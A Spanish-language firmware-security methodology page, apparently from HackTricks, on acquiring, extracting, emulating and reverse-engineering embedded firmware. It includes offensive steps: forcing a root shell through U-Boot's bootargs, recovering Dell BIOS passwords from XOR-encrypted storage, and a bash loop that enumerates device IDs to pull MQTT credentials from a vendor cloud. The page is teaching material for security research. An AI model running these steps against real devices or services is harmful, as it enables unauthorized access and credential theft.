# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introducción**

### Recursos relacionados

Para adquirir firmware mediante interfaces de hardware expuestas, consulta [volcado de firmware asistido por consola UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) y [volcado de memoria flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es un software esencial que permite que los dispositivos funcionen correctamente, ya que administra y facilita la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en una memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende y, así, iniciar el sistema operativo. Examinar y posiblemente modificar el firmware es un paso fundamental para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para entender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Los detalles del bootloader
- La disposición del hardware y las hojas de datos
- Las métricas de la base de código y las ubicaciones del código fuente
- Las bibliotecas externas y los tipos de licencia
- El historial de actualizaciones y las certificaciones reglamentarias
- Los diagramas de arquitectura y de flujo
- Las evaluaciones de seguridad y las vulnerabilidades identificadas

Para ello, las herramientas de **inteligencia de fuentes abiertas (OSINT)** son muy valiosas, al igual que el análisis de los componentes de software de código abierto disponibles mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [LGTM de Semmle](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede aprovecharse para encontrar posibles problemas.

## **Obtención del firmware**

El firmware se puede obtener de varias maneras, cada una con un nivel de complejidad distinto:

- **Directamente** de la fuente (desarrolladores, fabricantes)
- **Compilándolo** a partir de las instrucciones proporcionadas
- **Descargándolo** desde sitios oficiales de soporte
- Utilizando consultas de **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **almacenamiento en la nube**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas de man-in-the-middle
- **Extrayéndolo** del dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- **Capturando** solicitudes de actualización en las comunicaciones del dispositivo
- Identificando y utilizando **endpoints de actualización hardcodeados**
- **Volcándolo** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, como último recurso, con las herramientas de hardware adecuadas

### Registros solo por UART: forzar una root shell mediante el entorno de U-Boot en la memoria flash

Si se ignora UART RX (solo hay registros), aún puedes forzar una shell de init **editando sin conexión el bloque de entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Volcar la memoria flash SPI con un clip SOIC-8 y un programador (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localiza la partición env de U-Boot, edita `bootargs` para incluir `init=/bin/sh` y **vuelve a calcular el CRC32 del env de U-Boot** para el blob.
3. Vuelve a flashear solo la partición env y reinicia; debería aparecer una shell en UART.

Esto es útil en dispositivos embebidos cuyo shell del bootloader está deshabilitado, pero cuya partición env se puede escribir mediante acceso a la flash externa.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Estas son algunas herramientas que puedes usar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si es baja, probablemente no esté cifrada. Si es alta, probablemente esté cifrada (o comprimida de alguna manera).

Además, puedes usar estas herramientas para extraer **archivos incrustados en el firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

También puedes usar [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Análisis diferencial de flash y almacenes de secretos XOR recuperables

Cuando un ajuste del firmware no tiene un formato de almacenamiento documentado, primero realiza varias lecturas coincidentes de la flash, cambia **exactamente un** ajuste, vuelve a volcar el chip completo y compara los offsets. Repetir el experimento con valores controlados permite distinguir el ajuste de los contadores y los metadatos de escritura; los cambios en nuevos offsets, en lugar de in situ, indican un almacén de solo anexado o estructurado como un registro. Conserva las entradas eliminadas o marcadas como eliminadas, ya que los bytes de su payload podrían seguir siendo recuperables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After localizar la región, extrae los módulos del firmware con herramientas como `binwalk` y analiza mediante ingeniería inversa el writer/validator en Ghidra. Confirma en el código los límites de los campos, el padding, la indexación de claves y la derivación de claves, en lugar de inferir el esquema solo a partir de los patrones del ciphertext.<sup>[[12]](#references)</sup>

#### Recuperar claves a partir de padding cero cifrado

Como se describe en [cifrado basado en XOR](../../crypto/symmetric/#xor-based-encryption), el texto plano conocido revela bytes del keystream en los mismos offsets. Un campo de tamaño fijo queda especialmente expuesto cuando su padding cero abarca todos los índices de una clave XOR repetitiva: el padding cifrado revela directamente esos bytes de la clave porque `0x00 XOR key_byte = key_byte`. Si se cubren todos los índices de la clave, reconstruye la clave a partir de la cola del ciphertext y descifra los bytes con datos.<sup>[[12]](#references)</sup>

El formato vulnerable de contraseña de BIOS DVAR de Dell es un ejemplo concreto: el byte `0` de un campo de 32 bytes está en texto plano, mientras que los bytes `1..31` usan una clave repetitiva de 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Para una longitud de contraseña `L`, las posiciones `L..31` eran cero antes del XOR. Cuando `L <= 12`, esas posiciones cubren todos los índices de la clave, así que se recuperan la clave completa y la contraseña sin fuerza bruta:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Recuperar claves de registros históricos

No analices cada registro de forma independiente. La clave DVAR se deriva aproximadamente como `modified_md5(device_seed || variable_GUID || password[0])`: el seed del dispositivo y el GUID son fijos, y la única entrada que depende de la contraseña es el primer byte en claro. Esto da como máximo 256 claves por dispositivo y hace que los registros que empiezan con el mismo byte compartan una clave. Agrupa los registros activos y eliminados según ese byte; un registro histórico corto puede filtrar la clave completa mediante el padding y permitir descifrar un registro actual más largo cuyo padding no sea suficiente. Por lo tanto, rotar la contraseña puede aumentar la exposición si el ciphertext antiguo se marca como eliminado en lugar de borrarse.<sup>[[12]](#references)</sup>

La herramienta [`dellpwn`](https://github.com/R3n5k1/dellpwn) localiza DVAR, valida registros candidatos, recupera contraseñas y puede mostrar los bytes almacenados/en bruto y de la clave. Compílala desde un checkout y analiza una imagen flash verificada así:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Para parsers personalizados, descarta falsos positivos usando la estructura de los registros, restricciones sobre caracteres imprimibles, comprobaciones de padding con ceros, entropía de la clave y coherencia cuando la clave da la vuelta. Si los dumps repetidos muestran cambios dispersos de bits por escritura, enumera las máscaras observadas y ordena las correcciones según estas restricciones, pero indica los caracteres ambiguos en lugar de presentar un resultado heurístico como una recuperación exacta.<sup>[[12]](#references)</sup>

Los verificadores de contraseñas deberían almacenar un hash unidireccional con salt e iteraciones en lugar de ciphertext reversible, y los almacenes con estructura de log deberían eliminar de forma segura el material secreto reemplazado.<sup>[[12]](#references)</sup>

### Obtener el sistema de archivos

Con las herramientas comentadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk suele extraerlo en una **carpeta cuyo nombre corresponde al tipo de sistema de archivos**, que normalmente es uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no tendrá el byte mágico del sistema de archivos en sus firmas**. En estos casos, usa binwalk para **encontrar el offset del sistema de archivos y extraer el sistema de archivos comprimido** del binario, y **extrae manualmente** el sistema de archivos según su tipo siguiendo los pasos que aparecen a continuación.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Ejecuta el siguiente **comando dd** para extraer el sistema de archivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (utilizado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Después, los archivos estarán en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con memoria flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstrucción de sistemas de archivos raíz embebidos divididos

Si un volcado sin procesar de eMMC/SSD contiene un encabezado de sistema de archivos válido, pero sus desplazamientos de metadatos se extienden más allá de la partición nominal, no lo clasifiques inmediatamente como dañado. El código de arranque embebido puede ensamblar el dispositivo raíz real a partir de varios rangos físicos con Device Mapper, por lo que extraer una partición GPT solo produce el primer segmento.<sup>[[9]](#references)</sup>

#### Triage de la imagen completa del medio

Primero, verifica que la adquisición haya finalizado, que el tamaño sea estable y que ningún proceso de escritura siga usando la imagen. Si el nombre del archivo codifica una dirección inicial/final, compara ese rango con el número real de bytes. Recupera la GPT en modo de solo lectura y adjunta únicamente el rango necesario; **no** ejecutes `vgchange -ay` en un volumen físico no confiable en la estación de trabajo, ya que podrían producirse conflictos entre grupos de volúmenes y escrituras no deseadas.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Prefiere una VM desechable cuando la lógica de init original o una pila LVM necesite ver la imagen completa. Los registros históricos de arranque de una partición de arranque estándar son especialmente útiles: el bootloader puede haber registrado los offsets del contenedor propietario, las longitudes de los componentes, la selección de slot, las reglas de alineación y la verificación de firmas. Usa esos valores para extraer una línea de comandos, un kernel o un initramfs incrustados; después, valida cada resultado de forma independiente con `file`, bytes mágicos y `binwalk`. Leer hasta el final del contenedor puede añadir accidentalmente un initrd, un objeto ACPI o una firma al kernel.<sup>[[9]](#references)</sup>

#### Recuperar el mapa de bloques durante el arranque

Extrae el initramfs del kernel y aplica ingeniería inversa a su `/init` y a cualquier biblioteca de almacenamiento. En [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), sigue las referencias a cadenas de `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` y las rutas de partición; luego, rastrea el código que selecciona el slot A/B activo y construye la tabla. Algunos puntos de partida útiles en radare2 son `r2 -A init`, `afl`, `pdf @ main` y `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

El target linear asigna rangos consecutivos de un dispositivo virtual a rangos de uno o más dispositivos subyacentes. Una tabla recuperada de dos segmentos suele tener esta forma (todas las posiciones y longitudes están expresadas en sectores de 512 bytes):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduce exactamente la aritmética del código máquina, incluidos el ancho de los enteros, los desplazamientos y las conversiones de unidades. Por ejemplo, la siguiente expresión redondea hacia abajo el tamaño en bytes hasta un límite de 4 KiB y solo entonces lo convierte a sectores de 512 bytes; reemplazarla por `p4_bytes // 512` desplaza el extremo seleccionado en `p4_bytes % 4096` cuando la partición no está alineada a página.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruye una imagen de análisis plana copiando los rangos en el orden de la tabla y usando bloques acotados, en lugar de cargar el dump completo del medio en memoria. Esto también evita crear dispositivos mapper en el host. Mantén los offsets derivados de GPT, los recuentos de sectores invertidos y la longitud resultante de la salida como aserciones independientes.<sup>[[9]](#references)</sup>

#### Distinguir la corrupción de un error constante de reconstrucción

En SquashFS, comprueba el magic `hsqs` y decodifica el campo little-endian de 64 bits `bytes_used` en el offset 40 del superblock antes de ejecutar `unsquashfs`. Si la extracción falla en varias estructuras no relacionadas, busca en una ventana amplia alrededor de las posiciones esperadas y exige candidatos estructurales sólidos: un bloque de metadatos descomprimible, varias entradas de directorio válidas consecutivas, campos de inode plausibles, un inode raíz coherente con el recuento de inodes o una estructura válida de metadatos de integridad. Una sola coincidencia de magic no es suficiente.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Cuando el mismo delta firmado hace válidas estructuras independientes —por ejemplo, los metadatos del directorio y un registro verity—, la causa probable es un error sistemático en el inicio del segmento, no la falta de bytes. Vuelve a la aritmética invertida y busca restos descartados, signedness, desbordamiento o redondeo a sectores/páginas antes de intentar recuperar archivos huérfanos o parchear los metadatos del sistema de archivos.<sup>[[9]](#references)</sup>

Por último, mantén separados los límites de protección: los volúmenes LUKS sellados al TPM protegen la confidencialidad de los datos, mientras que un mapeo dm-verity firmado protege la integridad del sistema de archivos raíz. Un TPM de software no recupera una clave sellada al TPM físico original, y arrancar un SquashFS modificado mediante un init exclusivo para investigación que omite la verificación de verity no falsifica su firma ni vulnera dm-verity.<sup>[[9]](#references)</sup>

## Análisis del Firmware

Una vez obtenido el firmware, es esencial examinarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de las particiones y los sistemas de archivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere que no hay cifrado, mientras que una entropía alta indica un posible cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Con `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio cuyo nombre corresponde al tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de sistema de archivos porque faltan los magic bytes, es necesario extraerlo manualmente. Esto implica usar `binwalk` para localizar el offset del sistema de archivos y, a continuación, el comando `dd` para extraerlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se usan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales codificadas, los endpoints de API, las funcionalidades del servidor de actualizaciones, el código sin compilar, los scripts de inicio y los binarios compilados para su análisis offline.

Entre las **ubicaciones** y los **elementos clave** que se deben inspeccionar se incluyen:

- **etc/shadow** y **etc/passwd** para buscar credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts en busca de posibles vulnerabilidades
- Binarios integrados para su análisis posterior
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para un análisis exhaustivo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse minuciosamente en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protección que podrían explotarse.

## Obtención de la configuración cloud y las credenciales MQTT mediante tokens derivados de URL

Muchos hubs IoT obtienen la configuración específica de cada dispositivo desde un endpoint cloud con este formato:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible descubrir que `<token>` se deriva localmente del ID del dispositivo mediante un secreto codificado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Este diseño permite que cualquiera que conozca un deviceId y el STATIC_KEY reconstruya la URL y obtenga la configuración cloud, donde a menudo se revelan credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extraer deviceId de los registros de inicio UART

- Conecta un adaptador UART de 3.3 V (TX/RX/GND) y captura los registros:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Busca líneas que impriman el patrón de URL de configuración de la nube y la dirección del broker, por ejemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperar STATIC_KEY y el algoritmo del token del firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recopilar configuraciones de cloud y credenciales MQTT

- Construye la URL y descarga el JSON con curl; analiza el contenido con jq para extraer los secretos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusa de MQTT en texto plano y de ACL débiles para topics (si las hay)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivos predecibles (a gran escala, con autorización)

- Muchos ecosistemas incluyen bytes de OUI/producto/tipo del fabricante seguidos de un sufijo secuencial.
- Puedes recorrer IDs candidatos, derivar tokens y obtener configuraciones mediante programación:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Obtén siempre autorización explícita antes de intentar una enumeración masiva.
- Siempre que sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.


El proceso de emular firmware permite realizar **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar dificultades relacionadas con dependencias de hardware o arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con la misma arquitectura y el mismo endianness, como una Raspberry Pi, o a una máquina virtual preconfigurada, puede facilitar pruebas adicionales.

### Emular binarios individuales

Para examinar programas individuales, es crucial identificar el endianness y la arquitectura de CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario con arquitectura MIPS, se puede usar el comando:

```bash
file ./squashfs-root/bin/busybox
```

Y para instalar las herramientas de emulación necesarias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), se usa `qemu-mips`, y para los binarios little-endian, se elegiría `qemu-mipsel`.

#### Emulación de arquitectura ARM

Para los binarios ARM, el proceso es similar: se utiliza el emulador `qemu-arm` para la emulación.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.

### Reconstrucción de sistemas de archivos raíz divididos y verificados para la emulación

Si se puede leer un superbloque de SquashFS, pero los offsets de inode, directorio o tabla de fragmentos son imposibles, no parchees `unsquashfs` de inmediato. Haz ingeniería inversa del binario de arranque temprano y reproduce el grafo de dispositivos de bloques que crea: los sistemas integrados pueden exponer una partición raíz nominal, pero construir el sistema de archivos real con un mapeo `dm-linear` que añade sectores tomados de otra partición. Las comprobaciones que solo examinan el superbloque pueden tener éxito aunque todos los bloques de metadatos posteriores estén desplazados.<sup>[[11]](#references)</sup>

Preserva exactamente la aritmética del firmware. En particular, identifica si las longitudes se expresan en bytes, sectores de 512 bytes o páginas de 4 KiB; reproduce los desplazamientos de bits y el truncamiento en su orden original; y ten en cuenta las regiones finales que dependen del banco en los diseños A/B. Por ejemplo, `(partition_bytes >> 12) << 3` primero trunca al límite de 4 KiB y solo después expresa el resultado en sectores de 512 bytes; sustituirlo por `partition_bytes // 512` puede desplazar la extensión añadida unos pocos kilobytes y corromper todas las tablas de SquashFS posteriores.<sup>[[11]](#references)</sup>

Un flujo de validación útil es:<sup>[[11]](#references)</sup>

1. Recupera del binario del verificador/init el dispositivo de origen, el sector inicial y la longitud de cada segmento `dm-linear`.
2. Concatena o mapea las extensiones sin cambiar la semántica de alineación.
3. Si la extracción sigue fallando, busca solo en una ventana pequeña alrededor del límite previsto y exige varias estructuras de metadatos válidas consecutivas, en lugar de aceptar únicamente un superbloque plausible.
4. Ejecuta `unsquashfs` sin modificar sobre la imagen reconstruida; recorrer correctamente todos los directorios y fragmentos es una evidencia más sólida que `unsquashfs -stat`.

#### Sustitución de dm-verity controlada por el analista

Cuando el analista controla el kernel de QEMU, el initramfs y los discos virtuales, se puede arrancar una raíz modificada sustituyendo el PID 1 de verificación del proveedor por un pequeño init enlazado estáticamente. Esto es una **sustitución de la cadena de arranque en laboratorio**, no una vulneración de dm-verity, su firma RSA, Secure Boot ni una clave sellada a un TPM.<sup>[[11]](#references)</sup>

El init de reemplazo debería reproducir las partes operativas de la ruta de arranque original: montar `devtmpfs`, llamar a `setsid()`, conectar `/dev/console` a los descriptores de archivo 0–2, montar `/proc` y `/sys`, esperar al dispositivo de bloques proporcionado, montar la raíz editada en modo de solo lectura, desmontar los pseud sistemas de archivos de la raíz antigua, mover el nuevo montaje a `/`, ejecutar `chroot` y hacer `execve()` del `/sbin/init` original del firmware. Desmontar `/dev`, `/proc` y `/sys` **antes** de `MS_MOVE` evita desmontar accidentalmente puntos de montaje que pertenecen a la nueva raíz.<sup>[[11]](#references)</sup>

Mantén el estado mutable del dispositivo separado de la raíz inmutable modificada. Una superposición qcow2 puede conservar el estado LVM del disco original mientras un segundo disco virtio de solo lectura proporciona el SquashFS editado:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuración del estado de la imagen sin conexión

Inspecciona el estado persistente fuera del guest cuando los arranques lentos, los scripts de inicio destructivos o los registros de consola poco fiables dificulten identificar el fallo. Nunca conectes un overlay que esté usando una VM en ejecución; expónlo con `qemu-nbd`, limita la detección de LVM a la partición NBD prevista y desactiva el grupo de volúmenes antes de desconectarlo.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Para un aislamiento de fallos reproducible, escribe archivos marcadores con marcas de tiempo en un volumen estable con permisos de escritura y verifícalos sin conexión; `/dev/kmsg`, las FIFO y las consolas transitorias pueden producir falsos negativos por limitación de velocidad o por la finalización prematura de procesos. Compara también las interfaces exactas entre capas antes de cambiar código no relacionado: `uname -r` frente a `/lib/modules/`, las características de ext4 en disco frente a la configuración del kernel, y la generación de `libGL` de Mesa frente al ABI del controlador DRI y a los nombres de controladores derivados de PCI. Un componente puede existir e incluso cargarse correctamente con `dlopen()`, pero seguir siendo inutilizable porque quien lo consume espera un ABI distinto.<sup>[[11]](#references)</sup>

## Análisis dinámico en la práctica

En esta etapa, se utiliza para el análisis un entorno de dispositivo real o emulado. Es esencial mantener el acceso al shell del sistema operativo y al sistema de archivos. Es posible que la emulación no reproduzca fielmente las interacciones con el hardware, por lo que puede ser necesario reiniciarla ocasionalmente. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web y los servicios de red expuestos, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución consiste en interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / mapeo de mensajes del coprocesador de radio

En los hubs IoT, la pila de RF suele estar dividida entre un **MCU de radio** y un proceso de espacio de usuario de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **Trama RF** transmitida por el aire
2. **Parser del lado del controlador** en el MCU de radio
3. **Protocolo de texto serial/UART o TLV** reenviado a Linux (por ejemplo, `/dev/tty*`)
4. **Dispatcher de la aplicación** en el daemon principal
5. **Handler específico del protocolo / máquina de estados**

Esta arquitectura crea dos objetivos de ingeniería inversa en lugar de uno. Si el controlador convierte las tramas binarias de radio en un protocolo textual como `Group,Command,arg1,arg2,...`, recupera:

- Los **grupos de mensajes** y las tablas de dispatch
- Qué mensajes pueden provenir de la **red** frente al propio controlador
- Los **campos discriminadores exactos específicos del fabricante** (por ejemplo, Zigbee `manufacturer_code` y `cluster_command` personalizado)
- Qué handlers solo son alcanzables durante las fases de **commissioning**, descubrimiento o descarga de firmware/modelos

En Zigbee específicamente, captura el tráfico de pairing y comprueba si el objetivo todavía depende del **Link Key** predeterminado `ZigBeeAlliance09`. Si es así, el sniffing del tráfico de commissioning puede revelar la **Network Key**. Los códigos de instalación de Zigbee 3.0 reducen esta exposición, así que anota si el dispositivo probado realmente los exige.

### Handlers de protocolos específicos del fabricante y accesibilidad condicionada por FSM

Los comandos Zigbee/ZCL específicos del fabricante suelen ser un objetivo mejor que los clusters estandarizados porque alimentan **código de parsing personalizado** y **FSM** internas con validaciones menos probadas.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Analiza el dispatcher de comandos hasta encontrar el **handler exclusivo del fabricante**.
- Recupera las tablas de **estado de FSM**, **evento**, **comprobación**, **acción** y **siguiente estado**.
